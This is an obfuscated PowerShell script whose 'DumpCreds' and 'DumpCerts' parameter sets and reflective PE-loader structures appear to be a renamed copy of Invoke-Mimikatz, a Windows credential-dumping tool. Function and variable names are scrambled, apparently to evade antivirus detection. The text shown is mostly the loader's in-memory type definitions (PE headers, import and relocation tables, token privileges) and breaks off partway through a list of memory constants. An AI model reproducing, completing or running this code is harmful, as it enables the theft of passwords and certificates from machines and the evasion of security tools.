function sensationalism
{
[CmdletBinding(DefaultParameterSetName="DumpCreds")]
Param(
    [Parameter(Position = 0)]
    [String[]]
    $jkhxeKDw99,
    [Parameter(ParameterSetName = "DumpCreds", Position = 1)]
    [Switch]
    $XzrqUJTg99,
    [Parameter(ParameterSetName = "DumpCerts", Position = 1)]
    [Switch]
    $yPpWmguY99,
    [Parameter(ParameterSetName = "CustomCommand", Position = 1)]
    [String]
    $Command
)
Set-StrictMode -Version 2
$cyoyorWO99 = {
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $eTurxLiv99,
        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $JBqMhgEe99,
        
        [Parameter(Position = 2, Mandatory = $false)]
        [String]
        $IgRLbrsU99,
                
        [Parameter(Position = 3, Mandatory = $false)]
        [Int32]
        $zkndbVqG99,
        
        [Parameter(Position = 4, Mandatory = $false)]
        [String]
        $BxiWsjkC99,
        [Parameter(Position = 5, Mandatory = $false)]
        [String]
        $VqCLAkop99
    )
    
    Function sees
    {
        $XdmAcKgP99 = New-Object System.Object
        $cQMpYrst99 = [AppDomain]::CurrentDomain
        $ZFOmygLB99 = New-Object System.Reflection.AssemblyName('DynamicAssembly')
        $SHvOrApf99 = $cQMpYrst99.DefineDynamicAssembly($ZFOmygLB99, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $fVjOuTcg99 = $SHvOrApf99.DefineDynamicModule('DynamicModule', $false)
        $FCjBzORR99 = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
        $qmHxnvBU99 = $fVjOuTcg99.DefineEnum('MachineType', 'Public', [UInt16])
        $qmHxnvBU99.DefineLiteral('Native', [UInt16] 0) | Out-Null
        $qmHxnvBU99.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
        $qmHxnvBU99.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
        $qmHxnvBU99.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
        $LlhskUyk99 = $qmHxnvBU99.CreateType()
        $XdmAcKgP99 | Add-Member -MemberType NoteProperty -Name MachineType -Value $LlhskUyk99
        $qmHxnvBU99 = $fVjOuTcg99.DefineEnum('MagicType', 'Public', [UInt16])
        $qmHxnvBU99.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
        $qmHxnvBU99.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
        $foDGZrsL99 = $qmHxnvBU99.CreateType()
        $XdmAcKgP99 | Add-Member -MemberType NoteProperty -Name MagicType -Value $foDGZrsL99
        $qmHxnvBU99 = $fVjOuTcg99.DefineEnum('SubSystemType', 'Public', [UInt16])
        $qmHxnvBU99.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
        $qmHxnvBU99.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
        $qmHxnvBU99.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
        $qmHxnvBU99.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
        $qmHxnvBU99.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
        $qmHxnvBU99.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
        $qmHxnvBU99.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
        $qmHxnvBU99.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
        $qmHxnvBU99.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
        $qmHxnvBU99.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
        $qmHxnvBU99.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
        $QcbPWXYF99 = $qmHxnvBU99.CreateType()
        $XdmAcKgP99 | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $QcbPWXYF99
        $qmHxnvBU99 = $fVjOuTcg99.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
        $qmHxnvBU99.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
        $qmHxnvBU99.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
        $qmHxnvBU99.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
        $qmHxnvBU99.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
        $qmHxnvBU99.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
        $qmHxnvBU99.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
        $qmHxnvBU99.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
        $qmHxnvBU99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
        $qmHxnvBU99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
        $qmHxnvBU99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
        $qmHxnvBU99.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
        $qmHxnvBU99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
        $qmHxnvBU99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
        $QPDJghvO99 = $qmHxnvBU99.CreateType()
        $XdmAcKgP99 | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $QPDJghvO99
        $HMUdFNAI99 = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $qmHxnvBU99 = $fVjOuTcg99.DefineType('IMAGE_DATA_DIRECTORY', $HMUdFNAI99, [System.ValueType], 8)
        ($qmHxnvBU99.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
        ($qmHxnvBU99.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
        $pFShaPJB99 = $qmHxnvBU99.CreateType()
        $XdmAcKgP99 | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $pFShaPJB99
        $HMUdFNAI99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $qmHxnvBU99 = $fVjOuTcg99.DefineType('IMAGE_FILE_HEADER', $HMUdFNAI99, [System.ValueType], 20)
        $qmHxnvBU99.DefineField('Machine', [UInt16], 'Public') | Out-Null
        $qmHxnvBU99.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
        $qmHxnvBU99.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $qmHxnvBU99.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
        $qmHxnvBU99.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
        $qmHxnvBU99.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
        $qmHxnvBU99.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
        $txgTxdhy99 = $qmHxnvBU99.CreateType()
        $XdmAcKgP99 | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $txgTxdhy99
        $HMUdFNAI99 = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $qmHxnvBU99 = $fVjOuTcg99.DefineType('IMAGE_OPTIONAL_HEADER64', $HMUdFNAI99, [System.ValueType], 240)
        ($qmHxnvBU99.DefineField('Magic', $foDGZrsL99, 'Public')).SetOffset(0) | Out-Null
        ($qmHxnvBU99.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($qmHxnvBU99.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($qmHxnvBU99.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($qmHxnvBU99.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($qmHxnvBU99.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($qmHxnvBU99.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($qmHxnvBU99.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($qmHxnvBU99.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
        ($qmHxnvBU99.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($qmHxnvBU99.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($qmHxnvBU99.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($qmHxnvBU99.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($qmHxnvBU99.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($qmHxnvBU99.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($qmHxnvBU99.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($qmHxnvBU99.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($qmHxnvBU99.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($qmHxnvBU99.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($qmHxnvBU99.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($qmHxnvBU99.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($qmHxnvBU99.DefineField('Subsystem', $QcbPWXYF99, 'Public')).SetOffset(68) | Out-Null
        ($qmHxnvBU99.DefineField('DllCharacteristics', $QPDJghvO99, 'Public')).SetOffset(70) | Out-Null
        ($qmHxnvBU99.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
        ($qmHxnvBU99.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
        ($qmHxnvBU99.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
        ($qmHxnvBU99.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
        ($qmHxnvBU99.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
        ($qmHxnvBU99.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
        ($qmHxnvBU99.DefineField('ExportTable', $pFShaPJB99, 'Public')).SetOffset(112) | Out-Null
        ($qmHxnvBU99.DefineField('ImportTable', $pFShaPJB99, 'Public')).SetOffset(120) | Out-Null
        ($qmHxnvBU99.DefineField('ResourceTable', $pFShaPJB99, 'Public')).SetOffset(128) | Out-Null
        ($qmHxnvBU99.DefineField('ExceptionTable', $pFShaPJB99, 'Public')).SetOffset(136) | Out-Null
        ($qmHxnvBU99.DefineField('CertificateTable', $pFShaPJB99, 'Public')).SetOffset(144) | Out-Null
        ($qmHxnvBU99.DefineField('BaseRelocationTable', $pFShaPJB99, 'Public')).SetOffset(152) | Out-Null
        ($qmHxnvBU99.DefineField('Debug', $pFShaPJB99, 'Public')).SetOffset(160) | Out-Null
        ($qmHxnvBU99.DefineField('Architecture', $pFShaPJB99, 'Public')).SetOffset(168) | Out-Null
        ($qmHxnvBU99.DefineField('GlobalPtr', $pFShaPJB99, 'Public')).SetOffset(176) | Out-Null
        ($qmHxnvBU99.DefineField('TLSTable', $pFShaPJB99, 'Public')).SetOffset(184) | Out-Null
        ($qmHxnvBU99.DefineField('LoadConfigTable', $pFShaPJB99, 'Public')).SetOffset(192) | Out-Null
        ($qmHxnvBU99.DefineField('BoundImport', $pFShaPJB99, 'Public')).SetOffset(200) | Out-Null
        ($qmHxnvBU99.DefineField('IAT', $pFShaPJB99, 'Public')).SetOffset(208) | Out-Null
        ($qmHxnvBU99.DefineField('DelayImportDescriptor', $pFShaPJB99, 'Public')).SetOffset(216) | Out-Null
        ($qmHxnvBU99.DefineField('CLRRuntimeHeader', $pFShaPJB99, 'Public')).SetOffset(224) | Out-Null
        ($qmHxnvBU99.DefineField('Reserved', $pFShaPJB99, 'Public')).SetOffset(232) | Out-Null
        $exWabSDL99 = $qmHxnvBU99.CreateType()
        $XdmAcKgP99 | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $exWabSDL99
        $HMUdFNAI99 = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $qmHxnvBU99 = $fVjOuTcg99.DefineType('IMAGE_OPTIONAL_HEADER32', $HMUdFNAI99, [System.ValueType], 224)
        ($qmHxnvBU99.DefineField('Magic', $foDGZrsL99, 'Public')).SetOffset(0) | Out-Null
        ($qmHxnvBU99.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($qmHxnvBU99.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($qmHxnvBU99.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($qmHxnvBU99.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($qmHxnvBU99.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($qmHxnvBU99.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($qmHxnvBU99.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($qmHxnvBU99.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
        ($qmHxnvBU99.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
        ($qmHxnvBU99.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($qmHxnvBU99.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($qmHxnvBU99.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($qmHxnvBU99.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($qmHxnvBU99.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($qmHxnvBU99.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($qmHxnvBU99.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($qmHxnvBU99.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($qmHxnvBU99.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($qmHxnvBU99.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($qmHxnvBU99.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($qmHxnvBU99.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($qmHxnvBU99.DefineField('Subsystem', $QcbPWXYF99, 'Public')).SetOffset(68) | Out-Null
        ($qmHxnvBU99.DefineField('DllCharacteristics', $QPDJghvO99, 'Public')).SetOffset(70) | Out-Null
        ($qmHxnvBU99.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
        ($qmHxnvBU99.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
        ($qmHxnvBU99.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
        ($qmHxnvBU99.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
        ($qmHxnvBU99.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
        ($qmHxnvBU99.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
        ($qmHxnvBU99.DefineField('ExportTable', $pFShaPJB99, 'Public')).SetOffset(96) | Out-Null
        ($qmHxnvBU99.DefineField('ImportTable', $pFShaPJB99, 'Public')).SetOffset(104) | Out-Null
        ($qmHxnvBU99.DefineField('ResourceTable', $pFShaPJB99, 'Public')).SetOffset(112) | Out-Null
        ($qmHxnvBU99.DefineField('ExceptionTable', $pFShaPJB99, 'Public')).SetOffset(120) | Out-Null
        ($qmHxnvBU99.DefineField('CertificateTable', $pFShaPJB99, 'Public')).SetOffset(128) | Out-Null
        ($qmHxnvBU99.DefineField('BaseRelocationTable', $pFShaPJB99, 'Public')).SetOffset(136) | Out-Null
        ($qmHxnvBU99.DefineField('Debug', $pFShaPJB99, 'Public')).SetOffset(144) | Out-Null
        ($qmHxnvBU99.DefineField('Architecture', $pFShaPJB99, 'Public')).SetOffset(152) | Out-Null
        ($qmHxnvBU99.DefineField('GlobalPtr', $pFShaPJB99, 'Public')).SetOffset(160) | Out-Null
        ($qmHxnvBU99.DefineField('TLSTable', $pFShaPJB99, 'Public')).SetOffset(168) | Out-Null
        ($qmHxnvBU99.DefineField('LoadConfigTable', $pFShaPJB99, 'Public')).SetOffset(176) | Out-Null
        ($qmHxnvBU99.DefineField('BoundImport', $pFShaPJB99, 'Public')).SetOffset(184) | Out-Null
        ($qmHxnvBU99.DefineField('IAT', $pFShaPJB99, 'Public')).SetOffset(192) | Out-Null
        ($qmHxnvBU99.DefineField('DelayImportDescriptor', $pFShaPJB99, 'Public')).SetOffset(200) | Out-Null
        ($qmHxnvBU99.DefineField('CLRRuntimeHeader', $pFShaPJB99, 'Public')).SetOffset(208) | Out-Null
        ($qmHxnvBU99.DefineField('Reserved', $pFShaPJB99, 'Public')).SetOffset(216) | Out-Null
        $wYtMjeXA99 = $qmHxnvBU99.CreateType()
        $XdmAcKgP99 | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $wYtMjeXA99
        $HMUdFNAI99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $qmHxnvBU99 = $fVjOuTcg99.DefineType('IMAGE_NT_HEADERS64', $HMUdFNAI99, [System.ValueType], 264)
        $qmHxnvBU99.DefineField('Signature', [UInt32], 'Public') | Out-Null
        $qmHxnvBU99.DefineField('FileHeader', $txgTxdhy99, 'Public') | Out-Null
        $qmHxnvBU99.DefineField('OptionalHeader', $exWabSDL99, 'Public') | Out-Null
        $rbqhbTzu99 = $qmHxnvBU99.CreateType()
        $XdmAcKgP99 | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $rbqhbTzu99
        
        $HMUdFNAI99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $qmHxnvBU99 = $fVjOuTcg99.DefineType('IMAGE_NT_HEADERS32', $HMUdFNAI99, [System.ValueType], 248)
        $qmHxnvBU99.DefineField('Signature', [UInt32], 'Public') | Out-Null
        $qmHxnvBU99.DefineField('FileHeader', $txgTxdhy99, 'Public') | Out-Null
        $qmHxnvBU99.DefineField('OptionalHeader', $wYtMjeXA99, 'Public') | Out-Null
        $oZZDfkjy99 = $qmHxnvBU99.CreateType()
        $XdmAcKgP99 | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $oZZDfkjy99
        $HMUdFNAI99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $qmHxnvBU99 = $fVjOuTcg99.DefineType('IMAGE_DOS_HEADER', $HMUdFNAI99, [System.ValueType], 64)
        $qmHxnvBU99.DefineField('e_magic', [UInt16], 'Public') | Out-Null
        $qmHxnvBU99.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
        $qmHxnvBU99.DefineField('e_cp', [UInt16], 'Public') | Out-Null
        $qmHxnvBU99.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
        $qmHxnvBU99.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
        $qmHxnvBU99.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
        $qmHxnvBU99.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
        $qmHxnvBU99.DefineField('e_ss', [UInt16], 'Public') | Out-Null
        $qmHxnvBU99.DefineField('e_sp', [UInt16], 'Public') | Out-Null
        $qmHxnvBU99.DefineField('e_csum', [UInt16], 'Public') | Out-Null
        $qmHxnvBU99.DefineField('e_ip', [UInt16], 'Public') | Out-Null
        $qmHxnvBU99.DefineField('e_cs', [UInt16], 'Public') | Out-Null
        $qmHxnvBU99.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
        $qmHxnvBU99.DefineField('e_ovno', [UInt16], 'Public') | Out-Null
        $SioZTJUV99 = $qmHxnvBU99.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
        $LMsHTVvp99 = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $jsyNViqF99 = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
        $pZJYkxuo99 = New-Object System.Reflection.Emit.CustomAttributeBuilder($FCjBzORR99, $LMsHTVvp99, $jsyNViqF99, @([Int32] 4))
        $SioZTJUV99.SetCustomAttribute($pZJYkxuo99)
        $qmHxnvBU99.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
        $qmHxnvBU99.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null
        $dolZxQyV99 = $qmHxnvBU99.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
        $LMsHTVvp99 = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $pZJYkxuo99 = New-Object System.Reflection.Emit.CustomAttributeBuilder($FCjBzORR99, $LMsHTVvp99, $jsyNViqF99, @([Int32] 10))
        $dolZxQyV99.SetCustomAttribute($pZJYkxuo99)
        $qmHxnvBU99.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
        $wdnDBXJM99 = $qmHxnvBU99.CreateType()   
        $XdmAcKgP99 | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $wdnDBXJM99
        $HMUdFNAI99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $qmHxnvBU99 = $fVjOuTcg99.DefineType('IMAGE_SECTION_HEADER', $HMUdFNAI99, [System.ValueType], 40)
        $tDgYSeyk99 = $qmHxnvBU99.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
        $LMsHTVvp99 = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $pZJYkxuo99 = New-Object System.Reflection.Emit.CustomAttributeBuilder($FCjBzORR99, $LMsHTVvp99, $jsyNViqF99, @([Int32] 8))
        $tDgYSeyk99.SetCustomAttribute($pZJYkxuo99)
        $qmHxnvBU99.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
        $qmHxnvBU99.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        $qmHxnvBU99.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
        $qmHxnvBU99.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
        $qmHxnvBU99.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
        $qmHxnvBU99.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
        $qmHxnvBU99.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
        $qmHxnvBU99.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
        $qmHxnvBU99.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $wQIHPeMb99 = $qmHxnvBU99.CreateType()
        $XdmAcKgP99 | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $wQIHPeMb99
        $HMUdFNAI99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $qmHxnvBU99 = $fVjOuTcg99.DefineType('IMAGE_BASE_RELOCATION', $HMUdFNAI99, [System.ValueType], 8)
        $qmHxnvBU99.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        $qmHxnvBU99.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
        $joGESqQn99 = $qmHxnvBU99.CreateType()
        $XdmAcKgP99 | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $joGESqQn99
        $HMUdFNAI99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $qmHxnvBU99 = $fVjOuTcg99.DefineType('IMAGE_IMPORT_DESCRIPTOR', $HMUdFNAI99, [System.ValueType], 20)
        $qmHxnvBU99.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $qmHxnvBU99.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $qmHxnvBU99.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
        $qmHxnvBU99.DefineField('Name', [UInt32], 'Public') | Out-Null
        $qmHxnvBU99.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
        $JgGzHkJW99 = $qmHxnvBU99.CreateType()
        $XdmAcKgP99 | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $JgGzHkJW99
        $HMUdFNAI99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $qmHxnvBU99 = $fVjOuTcg99.DefineType('IMAGE_EXPORT_DIRECTORY', $HMUdFNAI99, [System.ValueType], 40)
        $qmHxnvBU99.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $qmHxnvBU99.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $qmHxnvBU99.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
        $qmHxnvBU99.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
        $qmHxnvBU99.DefineField('Name', [UInt32], 'Public') | Out-Null
        $qmHxnvBU99.DefineField('Base', [UInt32], 'Public') | Out-Null
        $qmHxnvBU99.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
        $qmHxnvBU99.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
        $qmHxnvBU99.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
        $qmHxnvBU99.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
        $qmHxnvBU99.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
        $ondwDwYL99 = $qmHxnvBU99.CreateType()
        $XdmAcKgP99 | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $ondwDwYL99
        
        $HMUdFNAI99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $qmHxnvBU99 = $fVjOuTcg99.DefineType('LUID', $HMUdFNAI99, [System.ValueType], 8)
        $qmHxnvBU99.DefineField('LowPart', [UInt32], 'Public') | Out-Null
        $qmHxnvBU99.DefineField('HighPart', [UInt32], 'Public') | Out-Null
        $LUID = $qmHxnvBU99.CreateType()
        $XdmAcKgP99 | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
        
        $HMUdFNAI99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $qmHxnvBU99 = $fVjOuTcg99.DefineType('LUID_AND_ATTRIBUTES', $HMUdFNAI99, [System.ValueType], 12)
        $qmHxnvBU99.DefineField('Luid', $LUID, 'Public') | Out-Null
        $qmHxnvBU99.DefineField('Attributes', [UInt32], 'Public') | Out-Null
        $oXQbQaWw99 = $qmHxnvBU99.CreateType()
        $XdmAcKgP99 | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $oXQbQaWw99
        
        $HMUdFNAI99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $qmHxnvBU99 = $fVjOuTcg99.DefineType('TOKEN_PRIVILEGES', $HMUdFNAI99, [System.ValueType], 16)
        $qmHxnvBU99.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
        $qmHxnvBU99.DefineField('Privileges', $oXQbQaWw99, 'Public') | Out-Null
        $fOCPHRCW99 = $qmHxnvBU99.CreateType()
        $XdmAcKgP99 | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $fOCPHRCW99
        return $XdmAcKgP99
    }
    Function gorged
    {
        $Win32Constants = New-Object System.Object
        
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
